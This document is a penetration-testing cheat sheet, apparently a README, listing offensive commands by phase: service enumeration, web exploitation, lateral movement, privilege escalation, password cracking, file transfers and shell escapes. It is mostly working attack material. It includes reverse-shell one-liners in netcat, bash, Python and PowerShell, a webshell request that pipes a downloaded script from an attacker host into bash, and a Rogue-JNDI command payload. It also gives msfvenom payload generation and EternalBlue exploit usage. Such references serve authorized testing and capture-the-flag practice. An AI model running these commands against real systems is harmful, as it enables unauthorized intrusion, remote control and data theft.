# Penetration Testing

Overview
---------
1. - [Enumeration](#1---enumeration)
2. - [Exploitation](#2---exploitation)
3. - [Lateral Movement](#3---lateral-movement)
4. - [Privilege Escalation](#4---privilege-escalation)
5. - [Brute Force](#5---brute-force)
6. - [File Transfers](#6---file-transfers)
7. - [Restricted Shell Escapes](#7---restricted-shell-escapes)
8. - [Reverse Shells](#8---reverse-shells)
9. - [Online Resources](#9---online-resources)
10. - [Browser Plugins](#10---browser-plugins)
11. - [Exploits](#11---exploits)
     
#1. - Enumeration
-----------------------------------------

- Nmap

```
$ nmap -sC -sV -p- -Pn -A <IP address>
$ nmap -sC -sV -p- -Pn -A -sU <IP address>
$ nmap --top-ports=100 <IP address>
$ nmap <IP address> --script vuln
```

- FTP (port 21)

```
$ ftp <IP address> (anonymous:anonymous)
ftp> dir
ftp> get <file>
ftp> put <file>
```

- Telnet (port 23)

```
$ telnet <IP address>
```

- TFTP (udp/port 69)

```
$ tftp <IP address>
tftp> get <file>
tftp> put <file>
```

- HTTP/HTTPS (port 80/443)

```
$ gobuster dir -w <wordlist> -u <URL>
$ gobuster dir -w <wordlist> -u <URL> -x php,html
$ gobuster vhost -w <wordlist> -u <URL>
```

- SMB (port 445)

```
$ smbclient -L <IP address>
$ smbclient -L <IP address> -U <username>
$ smbclient \\\\<IP address>\\c$
$ smbclient \\\\<IP address>\\c$ -U <username>
$ smbmap -H <IP address>
$ smbmap -H <IP address> -u <username> -p <password>
msf> use auxiliary/scanner/smb/smb_version
msf> use exploit/windows/smb/ms17_010_eternalblue
```

- Rsync (port 873)

```
$ rsync --list-only <IP address>::
$ rsync --list-only <IP address>::<share>
$ rsync <IP address>::<share>/<filename> <filename>
```

- MSSQL (port 1433)

```
$ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
SQL> SELECT is_srvrolemember('sysadmin');
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell "whoami";
```

- MySQL (port 3306)

```
$ mysql -h <IP address> -u root
MariaDB [(none)]> SHOW databases;
MariaDB [(none)]> USE <database name>;
MariaDB [(none)]> SHOW tables;
MariaDB [(none)]> SELECT * FROM <table name>;
```

- RDP (port 3389)

```
$ xfreerdp /v:<IP address>
$ xfreerdp /v:<IP address> /u:Administrator
$ freerdp /v:<IP address> /cert:ignore /u:Administrator
```

- PostgreSQL (port 5432)

```
$ psql -h <IP address> -U <username> -p <password>
<username>=# \l
<username>=# \c secrets
<username>=# \dt
<username>=# SELECT * FROM <table>;
```

- Redis (port 6379)

```
$ redis-cli -h <IP address>
<IP address>:6379> select <db number e.g. 0>
<IP address>:6379> keys *
<IP address>:6379> get <key>
```

- MongoDB (port 27017/27117)

```
$ ./mongo mongodb://<IP address>:27017
> show dbs;
> use <db name>;
> show collections;
> db.<collection>.find().pretty();
$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<Object ID>")},{$set:{"x_shadow":"<SHA-512 hash>"}})'
```

#2. - Exploitation
-----------------------------------------

- Local File Inclusion (LFI)

```
http://<domain name>/<page>?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

- Remote File Inclusion (RFI)

```
sudo responder -I <network interface>
http://<domain name>/<page>?page=//<IP address>/somefile
```

- Server Side Template Injection (SSTI)

```
${7*7}
```

- Webshell

```
http://<domain name>/shell.php?cmd=id
http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
```

- Sqlmap

```
$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>"
$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>" --os-shell
```

- Rogue-JNDI

```
$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} | {base64,-d}|{bash,-i}" --hostname "<IP address>"
```

#3. - Lateral Movement
-----------------------------------------

- Evil-winrm

```
$ evil-winrm -i <IP address> -u <username> -p <password>
```

- Local Port Forwarding

```
$ ssh -L 1234:localhost:5432 <username>@<remote IP address>
```

- Dynamic Port Forwarding

```
$ ssh -D 1234 <username>@<remote IP address>
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

- PsExec

```
$ python psexec.py <username>:<password>@<IP address>
$ python psexec.py <username>@<IP address>
```

#4. - Privilege Escalation
-----------------------------------------

- WinPEAS

```
C:\> .\winPEASx64.exe
```

- LinPEAS

```
$ ./linpeas.sh
```

#5. - Brute Force
-----------------------------------------

- HashID

```
$ hashid <hash>
```

- John The Ripper

```
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
$ john --show hashes.txt
```

- Hydra

```
$ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
```

- Zip2john

```
$ zip2john <ZIP file> > hashes.txt
```

- Hashcat

```
$ hashcat -a 0 -m 0 hashes.txt <wordlist>
```

#6. - File Transfers
-----------------------------------------

- Host Files

```
$ nc -nlvp 443 < file.txt
$ python -m SimpleHTTPServer 80
$ python3 -m http.server 8000
```

- Download Files

```
$ nc -nv <IP address> 443 > file.txt
$ wget http://<IP address>:8000/exploit.sh
$ curl http://<IP address>:8000/exploit.sh | bash
```

#7. - Restricted Shell Escapes
-----------------------------------------

- Shell Escapes

```
$ bash -i
$ echo os.system('/bin/bash')
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ script /dev/null -c bash
```

- Tab Auto Completion

```
$ CTRL+Z
$ stty raw -echo
$ fg
$ reset
```

#8. - Reverse Shells
-----------------------------------------

- Reverse Shells

```
$ nc -nv <IP address> <port> -e /bin/bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address> <port> >/tmp/f
$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP address>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

MSFvenom

```
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
Edit IP address and port

$ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<Port> -f raw > shell.php
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP address> LPORT=<Port> -f raw > shell.php
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f asp > shell.asp
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f aspx > shell.aspx
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war > shell.war
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
```

#9 - Online Resources
-----------------------------------------

- Speedguide

```
https://www.speedguide.net/port.php?port=3389
```

- CrackStation

```
https://crackstation.net/
```

#10 - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```

#11 - Exploits
-----------------------------------------

- MS17-010

```
https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
$ ./zzz_exploit.py <IP address> ntsvcs
https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
https://github.com/3ndG4me/AutoBlue-MS17-010
```
